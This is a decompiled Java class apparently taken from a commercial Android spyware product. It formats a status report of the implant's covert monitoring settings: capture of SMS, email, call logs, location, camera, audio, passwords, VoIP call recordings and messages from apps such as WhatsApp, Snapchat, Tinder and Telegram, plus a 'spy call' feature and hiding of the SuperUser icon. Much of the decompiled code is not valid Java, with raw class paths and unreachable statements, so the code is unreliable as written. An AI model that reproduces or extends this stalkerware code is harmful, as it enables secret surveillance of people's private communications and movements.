package com.vvt.remotecommand.processor.h;

import com.vvt.base.FeatureId;
import com.vvt.base.FxDeliveryMethod;
import com.vvt.base.RunningMode;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode.Mode;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource.AudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputImAttachmentLimitSize;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode.Mode;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.List;

public class d
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private final String c;
  
  public d(com.vvt.remotecontrol.a parama)
  {
    super(parama);
    String str = System.getProperty("line.separator");
    this.c = str;
  }
  
  private String a()
  {
    boolean bool = ShellUtil.c();
    if (bool) {}
    for (String str = "Rooted";; str = "Not-Rooted") {
      return str;
    }
  }
  
  private String a(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    String str = "Unknown";
    int[] arrayOfInt = e.a;
    RunningMode localRunningMode = paramRmtCtrlOutputSettings.getRunningMode();
    int i = localRunningMode.ordinal();
    int j = arrayOfInt[i];
    switch (j)
    {
    }
    for (;;)
    {
      return str;
      str = "Normal";
      continue;
      str = "Limited1";
      continue;
      str = "Full";
    }
  }
  
  private String a(String paramString, List paramList)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>(paramString);
    Object localObject = ":";
    localStringBuilder = localStringBuilder.append((String)localObject);
    if (paramList != null)
    {
      int i = paramList.size();
      if (i != 0) {}
    }
    else
    {
      localObject = "None";
      localStringBuilder.append((String)localObject);
    }
    for (;;)
    {
      return localStringBuilder.toString();
      localStringBuilder.append("[");
      localObject = paramList.toArray();
      String str = ", ";
      localObject = com.vvt.ag.b.a((Object[])localObject, str);
      localStringBuilder.append((String)localObject);
      localObject = "]";
      localStringBuilder.append((String)localObject);
    }
  }
  
  private void a(StringBuilder paramStringBuilder, String paramString)
  {
    int i = paramStringBuilder.length();
    if (i > 0)
    {
      String str = this.c;
      paramStringBuilder.append(str);
    }
    paramStringBuilder.append(paramString);
  }
  
  private boolean a(RmtCtrlOutputSettings paramRmtCtrlOutputSettings, List paramList, FeatureId paramFeatureId)
  {
    boolean bool = paramRmtCtrlOutputSettings.getFeatureStatus(paramFeatureId);
    if (bool)
    {
      bool = paramList.contains(paramFeatureId);
      if (!bool) {}
    }
    for (bool = true;; bool = false) {
      return bool;
    }
  }
  
  private boolean a(RmtCtrlOutputSettings paramRmtCtrlOutputSettings, List paramList, boolean paramBoolean)
  {
    boolean bool1 = true;
    FeatureId localFeatureId = FeatureId.CAPTURE_CALLLOG;
    boolean bool2 = paramList.contains(localFeatureId);
    if (bool2) {}
    for (;;)
    {
      return bool1;
      localFeatureId = FeatureId.CAPTURE_SMS;
      bool2 = paramList.contains(localFeatureId);
      if (!bool2)
      {
        localFeatureId = FeatureId.CAPTURE_EMAIL;
        bool2 = paramList.contains(localFeatureId);
        if (!bool2)
        {
          localFeatureId = FeatureId.CAPTURE_MMS;
          bool2 = paramList.contains(localFeatureId);
          if (!bool2)
          {
            localFeatureId = FeatureId.CAPTURE_LOCATION;
            bool2 = paramList.contains(localFeatureId);
            if (!bool2)
            {
              localFeatureId = FeatureId.CAPTURE_CAMERAIMAGE;
              bool2 = paramList.contains(localFeatureId);
              if (!bool2)
              {
                localFeatureId = FeatureId.CAPTURE_SOUND_RECORDING;
                bool2 = paramList.contains(localFeatureId);
                if (!bool2)
                {
                  localFeatureId = FeatureId.CAPTURE_VIDEO_RECORDING;
                  bool2 = paramList.contains(localFeatureId);
                  if (!bool2)
                  {
                    localFeatureId = FeatureId.CAPTURE_WALLPAPER;
                    bool2 = paramList.contains(localFeatureId);
                    if (!bool2)
                    {
                      localFeatureId = FeatureId.CAPTURE_APPLICATION;
                      bool2 = paramList.contains(localFeatureId);
                      if (!bool2)
                      {
                        localFeatureId = FeatureId.CAPTURE_BROWSER_URL;
                        bool2 = paramList.contains(localFeatureId);
                        if (!bool2)
                        {
                          localFeatureId = FeatureId.CAPTURE_CALENDAR;
                          bool2 = paramList.contains(localFeatureId);
                          if (!bool2)
                          {
                            localFeatureId = FeatureId.CAPTURE_IM;
                            bool2 = paramList.contains(localFeatureId);
                            if (!bool2)
                            {
                              localFeatureId = FeatureId.ADDRESS_BOOK_MANAGEMENT;
                              bool2 = paramList.contains(localFeatureId);
                              if (!bool2)
                              {
                                localFeatureId = FeatureId.CAPTURE_PASSWORD;
                                bool2 = paramList.contains(localFeatureId);
                                if (!bool2)
                                {
                                  localFeatureId = FeatureId.CAPTURE_VOIP_CALLLOG;
                                  bool2 = paramList.contains(localFeatureId);
                                  if (!bool2)
                                  {
                                    localFeatureId = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
                                    bool2 = paramList.contains(localFeatureId);
                                    if (!bool2)
                                    {
                                      localFeatureId = FeatureId.CAPTURE_CONTACT;
                                      bool2 = paramList.contains(localFeatureId);
                                      if (!bool2) {
                                        bool1 = false;
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  
  private String b(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    boolean bool1 = true;
    String str1 = "Capture:%s";
    Object[] arrayOfObject = new Object[bool1];
    boolean bool2 = paramRmtCtrlOutputSettings.isCaptureEnabled();
    if (bool2 == bool1) {}
    for (String str2 = "On";; str2 = "Off")
    {
      arrayOfObject[0] = str2;
      return String.format(str1, arrayOfObject);
    }
  }
  
  private String b(RmtCtrlOutputSettings paramRmtCtrlOutputSettings, List paramList, boolean paramBoolean)
  {
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = FeatureId.CAPTURE_CALLLOG;
    boolean bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Call logs";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_SMS;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "SMS";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_EMAIL;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Email";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_MMS;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "MMS";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_LOCATION;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Location";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_CAMERAIMAGE;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Image";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_SOUND_RECORDING;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Audio";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_VIDEO_RECORDING;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Video";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_WALLPAPER;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Wallpaper";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_APPLICATION;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Application Life Cycles";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_BROWSER_URL;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Browser URL";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_CALENDAR;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Calendar";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_IM;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "IM";
      ((ArrayList)localObject1).add(localObject2);
      bool = paramRmtCtrlOutputSettings.isBBMCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM BBM";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isFacebookCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Facebook";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isHangoutCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Hangout";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isLineCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM LINE";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isSkypeCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Skype";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isViberCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Viber";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isWeChatCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM WeChat";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isWhatsAppCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM WhatsApp";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isYahooMessengerCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM YahooMessenger";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isSnapchatCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Snapchat";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isKikMessengerCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM KIK Messenger";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isTelegramMessengerCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Telegram";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isTinderCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Tinder";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isInstagramCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Instagram";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isQQCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM QQ Messenger";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isHikeCaptureEnabled();
      if (bool)
      {
        localObject2 = "IM Hike Messenger";
        ((ArrayList)localObject1).add(localObject2);
      }
    }
    localObject2 = FeatureId.ADDRESS_BOOK_MANAGEMENT;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = FeatureId.CAPTURE_CONTACT;
      bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
      if (bool)
      {
        localObject2 = "Address book";
        ((ArrayList)localObject1).add(localObject2);
      }
    }
    localObject2 = FeatureId.CAPTURE_PASSWORD;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "Password";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_VOIP_CALLLOG;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "VoIP";
      ((ArrayList)localObject1).add(localObject2);
    }
    localObject2 = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
    bool = a(paramRmtCtrlOutputSettings, paramList, (FeatureId)localObject2);
    if (bool)
    {
      localObject2 = "VoIP Call Recording";
      ((ArrayList)localObject1).add(localObject2);
      bool = paramRmtCtrlOutputSettings.isViberVoipCallRecordingCaptureEnabled();
      if (bool)
      {
        localObject2 = "Viber VoIP Call Recording";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isSkypeVoipCallRecordingCaptureEnabled();
      if (bool)
      {
        localObject2 = "Skype VoIP Call Recording";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isLineVoipCallRecordingCaptureEnabled();
      if (bool)
      {
        localObject2 = "LINE VoIP Call Recording";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isHangoutVoipCallRecordingCaptureEnabled();
      if (bool)
      {
        localObject2 = "Hangout VoIP Call Recording";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isWhatsAppVoipCallRecordingCaptureEnabled();
      if (bool)
      {
        localObject2 = "WhatsApp VoIP Call Recording";
        ((ArrayList)localObject1).add(localObject2);
      }
      bool = paramRmtCtrlOutputSettings.isFacebookVoipCallRecordingCaptureEnabled();
      if (bool)
      {
        localObject2 = "Facebook VoIP Call Recording";
        ((ArrayList)localObject1).add(localObject2);
      }
    }
    int i = ((ArrayList)localObject1).size();
    Object[] arrayOfObject;
    if (i > 0)
    {
      localObject2 = "Events:%s";
      int j = 1;
      arrayOfObject = new Object[j];
      localObject1 = ((ArrayList)localObject1).toArray();
      String str = ", ";
      localObject1 = com.vvt.ag.b.a((Object[])localObject1, str);
      arrayOfObject[0] = localObject1;
    }
    for (localObject1 = String.format((String)localObject2, arrayOfObject);; localObject1 = "Events: None") {
      return (String)localObject1;
    }
  }
  
  private String c(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    int i = 1;
    int j = paramRmtCtrlOutputSettings.getDeliveryTimer();
    Object localObject1;
    int k;
    Object localObject2;
    Object[] arrayOfObject;
    if (j <= 0)
    {
      localObject1 = "No delivery";
      k = paramRmtCtrlOutputSettings.getTriggerNumber();
      if ((k != 0) && (k != i)) {
        break label141;
      }
      localObject2 = "%d event";
      arrayOfObject = new Object[i];
      localObject3 = Integer.valueOf(k);
      arrayOfObject[0] = localObject3;
    }
    for (Object localObject3 = String.format((String)localObject2, arrayOfObject);; localObject3 = String.format((String)localObject2, arrayOfObject))
    {
      arrayOfObject = new Object[2];
      arrayOfObject[0] = localObject1;
      arrayOfObject[i] = localObject3;
      return String.format("Delivery rules:%s, %s", arrayOfObject);
      if (j == i)
      {
        localObject1 = "1 hour";
        break;
      }
      localObject3 = "%d hours";
      localObject2 = new Object[i];
      localObject1 = Integer.valueOf(j);
      localObject2[0] = localObject1;
      localObject1 = String.format((String)localObject3, (Object[])localObject2);
      break;
      label141:
      localObject2 = "%d events";
      arrayOfObject = new Object[i];
      localObject3 = Integer.valueOf(k);
      arrayOfObject[0] = localObject3;
    }
  }
  
  private String d(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    boolean bool1 = true;
    Object localObject = FeatureId.SPY_CALL;
    boolean bool2 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject);
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    String str = "Spy call:%s";
    Object[] arrayOfObject = new Object[bool1];
    if (bool2 == bool1) {}
    for (localObject = "On";; localObject = "Off")
    {
      arrayOfObject[0] = localObject;
      localObject = String.format(str, arrayOfObject);
      localStringBuilder.append((String)localObject);
      return localStringBuilder.toString();
    }
  }
  
  private String e(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("Monitor numbers:");
    Object localObject = FeatureId.MONITOR_NUMBER;
    localObject = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject);
    if (localObject != null)
    {
      int i = ((List)localObject).size();
      if (i != 0) {}
    }
    else
    {
      localObject = "None";
      localStringBuilder.append((String)localObject);
    }
    for (;;)
    {
      return localStringBuilder.toString();
      localStringBuilder.append("[");
      localObject = ((List)localObject).toArray();
      String str = ", ";
      localObject = com.vvt.ag.b.a((Object[])localObject, str);
      localStringBuilder.append((String)localObject);
      localObject = "]";
      localStringBuilder.append((String)localObject);
    }
  }
  
  private String f(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    int i = 1;
    Object localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
    boolean bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    String str = "Watch options:%s";
    Object[] arrayOfObject = new Object[i];
    int j;
    int m;
    label143:
    int k;
    int i1;
    if (bool1)
    {
      localObject1 = "On";
      arrayOfObject[0] = localObject1;
      localObject1 = String.format(str, arrayOfObject);
      localStringBuilder.append((String)localObject1);
      localObject1 = ", ";
      localStringBuilder.append((String)localObject1);
      j = paramRmtCtrlOutputSettings.getWatchFlag();
      boolean bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      bool2 = j & 0x1;
      if (bool2 != i) {
        break label343;
      }
      m = i;
      k = j & 0x2;
      i1 = 2;
      if (k != i1) {
        break label349;
      }
      i1 = i;
      label162:
      k = j & 0x4;
      int i2 = 4;
      if (k != i2) {
        break label358;
      }
      k = i;
      label181:
      j &= 0x8;
      i2 = 8;
      if (j != i2) {
        break label367;
      }
      j = i;
    }
    for (;;)
    {
      localStringBuilder.append("[");
      Object localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = m + ", ";
      localStringBuilder.append((String)localObject2);
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = i1 + ", ";
      localStringBuilder.append((String)localObject2);
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = k + ", ";
      localStringBuilder.append((String)localObject2);
      localStringBuilder.append(j);
      localStringBuilder.append("]");
      return localStringBuilder.toString();
      localObject1 = "Off";
      break;
      label343:
      int n = 0;
      break label143;
      label349:
      i1 = 0;
      arrayOfObject = null;
      break label162;
      label358:
      k = 0;
      str = null;
      break label181;
      label367:
      j = 0;
      localObject1 = null;
    }
  }
  
  private String g(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    Object localObject = null;
    int i = 1;
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    String str = "Call recording watch flags: ";
    localStringBuilder.append(str);
    int j = paramRmtCtrlOutputSettings.getCallRecWatchFlag();
    int k = a;
    if (k != 0) {}
    k = a;
    if (k != 0) {}
    k = a;
    if (k != 0) {}
    k = a;
    if (k != 0) {}
    k = a;
    if (k != 0) {}
    k = j & 0x1;
    int n;
    int m;
    int i2;
    if (k == i)
    {
      n = i;
      m = j & 0x2;
      i2 = 2;
      if (m != i2) {
        break label279;
      }
      i2 = i;
      label117:
      m = j & 0x4;
      int i3 = 4;
      if (m != i3) {
        break label285;
      }
      m = i;
      label136:
      j &= 0x8;
      i3 = 8;
      if (j != i3) {
        break label294;
      }
    }
    for (;;)
    {
      localStringBuilder.append("[");
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = n + ", ";
      localStringBuilder.append((String)localObject);
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = i2 + ", ";
      localStringBuilder.append((String)localObject);
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = m + ", ";
      localStringBuilder.append((String)localObject);
      localStringBuilder.append(i);
      localStringBuilder.append("]");
      return localStringBuilder.toString();
      int i1 = 0;
      break;
      label279:
      i2 = 0;
      break label117;
      label285:
      m = 0;
      str = null;
      break label136;
      label294:
      i = 0;
    }
  }
  
  private String h(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    RmtCtrlInputAddressBookMode.Mode localMode = paramRmtCtrlOutputSettings.getAddressBookMode();
    String str = "Off";
    Object localObject = e.b;
    int i = localMode.ordinal();
    i = localObject[i];
    switch (i)
    {
    }
    for (;;)
    {
      localObject = new Object[1];
      localObject[0] = str;
      return String.format("Address book Management mode:%s", (Object[])localObject);
      str = "Monitor";
      continue;
      str = "Restrict";
    }
  }
  
  private String i(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    RmtCtrlInputPanicMode.Mode localMode = paramRmtCtrlOutputSettings.getPanicMode();
    String str = "Unknown";
    Object localObject = e.c;
    int i = localMode.ordinal();
    i = localObject[i];
    switch (i)
    {
    }
    for (;;)
    {
      localObject = new Object[1];
      localObject[0] = str;
      return String.format("Panic mode:%s", (Object[])localObject);
      str = "Location and Image";
      continue;
      str = "Location Only";
    }
  }
  
  private String j(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    Object localObject = paramRmtCtrlOutputSettings.getDeliveryMethod();
    int[] arrayOfInt = e.d;
    int i = ((FxDeliveryMethod)localObject).ordinal();
    i = arrayOfInt[i];
    switch (i)
    {
    default: 
      localObject = "Undefined";
    }
    for (;;)
    {
      return (String)localObject;
      localObject = "Any available";
      continue;
      localObject = "Wi-Fi";
    }
  }
  
  private String k(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    return paramRmtCtrlOutputSettings.getCallRecordingAudioSource().getName();
  }
  
  private String l(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    boolean bool = paramRmtCtrlOutputSettings.isSuperUserIconHidden();
    if (bool) {}
    for (String str = "Hide";; str = "Show") {
      return str;
    }
  }
  
  private String m(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    int i = 3;
    int j = 2;
    int k = 1;
    long l = 1048576L;
    Object localObject = paramRmtCtrlOutputSettings.getImAttachmentLimitSize();
    int m = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(0).longValue() / l);
    int n = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(k).longValue() / l);
    int i1 = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(j).longValue() / l);
    int i2 = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(i).longValue() / l);
    Object[] arrayOfObject = new Object[4];
    Integer localInteger = Integer.valueOf(m);
    arrayOfObject[0] = localInteger;
    localInteger = Integer.valueOf(n);
    arrayOfObject[k] = localInteger;
    localInteger = Integer.valueOf(i1);
    arrayOfObject[j] = localInteger;
    localObject = Integer.valueOf(i2);
    arrayOfObject[i] = localObject;
    return String.format("image[%sMB], audio[%sMB], video[%sMB], non-media[%sMB]", arrayOfObject);
  }
  
  String a(RmtCtrlOutputSettings paramRmtCtrlOutputSettings, List paramList, boolean paramBoolean1, boolean paramBoolean2)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    bool1 = a(paramRmtCtrlOutputSettings, paramList, paramBoolean1);
    boolean bool2 = b;
    if ((!bool2) || (bool1))
    {
      localObject1 = b(paramRmtCtrlOutputSettings);
      a(localStringBuilder, (String)localObject1);
      localObject1 = c(paramRmtCtrlOutputSettings);
      a(localStringBuilder, (String)localObject1);
      localObject1 = b(paramRmtCtrlOutputSettings, paramList, paramBoolean1);
      a(localStringBuilder, (String)localObject1);
    }
    Object localObject1 = FeatureId.CAPTURE_LOCATION;
    bool1 = paramList.contains(localObject1);
    Object localObject2;
    Object localObject3;
    if (bool1)
    {
      localObject2 = new Object[i];
      long l = paramRmtCtrlOutputSettings.getGpsTrackingIntervalMs();
      localObject3 = com.vvt.remotecommand.d.a(l);
      localObject2[0] = localObject3;
      localObject1 = String.format("Location interval:%s", (Object[])localObject2);
      a(localStringBuilder, (String)localObject1);
    }
    localObject1 = FeatureId.SPY_CALL;
    bool1 = paramList.contains(localObject1);
    if ((bool1) && (paramBoolean2))
    {
      localObject1 = d(paramRmtCtrlOutputSettings);
      a(localStringBuilder, (String)localObject1);
    }
    localObject1 = FeatureId.MONITOR_NUMBER;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = e(paramRmtCtrlOutputSettings);
      a(localStringBuilder, (String)localObject1);
    }
    localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = f(paramRmtCtrlOutputSettings);
      a(localStringBuilder, (String)localObject1);
    }
    localObject1 = FeatureId.SIM_CHANGE_NOTIFICATION;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = "SIM notification:On";
      a(localStringBuilder, (String)localObject1);
    }
    a(localStringBuilder, "Auto start:On");
    localObject1 = FeatureId.HOME_NUMBER;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject2 = FeatureId.HOME_NUMBER;
      localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
      localObject1 = a("Home", (List)localObject2);
      a(localStringBuilder, (String)localObject1);
    }
    localObject1 = FeatureId.PANIC;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = i(paramRmtCtrlOutputSettings);
      a(localStringBuilder, (String)localObject1);
    }
    localObject1 = FeatureId.COMMUNICATION_RESTRICTION;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = FeatureId.COMMUNICATION_RESTRICTION;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      localObject2 = "Communication restrictions:%s";
      localObject3 = new Object[i];
      if (bool1)
      {
        localObject1 = "On";
        localObject3[0] = localObject1;
        localObject1 = String.format((String)localObject2, (Object[])localObject3);
        a(localStringBuilder, (String)localObject1);
      }
    }
    else
    {
      localObject2 = new Object[i];
      int j = paramRmtCtrlOutputSettings.getConfigurationId();
      localObject3 = Integer.valueOf(j);
      localObject2[0] = localObject3;
      localObject1 = String.format("Configuration:%d", (Object[])localObject2);
      a(localStringBuilder, (String)localObject1);
      localObject1 = FeatureId.PANIC;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = FeatureId.PANIC;
        bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        localObject2 = "Panic:%s";
        localObject3 = new Object[i];
        if (!bool1) {
          break label1602;
        }
        localObject1 = "On";
        label592:
        localObject3[0] = localObject1;
        localObject1 = String.format((String)localObject2, (Object[])localObject3);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.ALERT_LOCK;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = FeatureId.ALERT_LOCK;
        bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        localObject2 = "Device lock:%s";
        localObject3 = new Object[i];
        if (!bool1) {
          break label1609;
        }
        localObject1 = "On";
        label669:
        localObject3[0] = localObject1;
        localObject1 = String.format((String)localObject2, (Object[])localObject3);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.EMERGENCY_NUMBER;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject2 = FeatureId.EMERGENCY_NUMBER;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject1 = a("Emergency", (List)localObject2);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject2 = FeatureId.CALL_WATCH_NOTIFICATION;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject1 = a("Watch numbers", (List)localObject2);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.ADDRESS_BOOK_MANAGEMENT;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = h(paramRmtCtrlOutputSettings);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.APP_PROFILE;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = FeatureId.APP_PROFILE;
        bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        localObject2 = "Enable Application Profile:%s";
        localObject3 = new Object[i];
        if (!bool1) {
          break label1616;
        }
        localObject1 = "On";
        label885:
        localObject3[0] = localObject1;
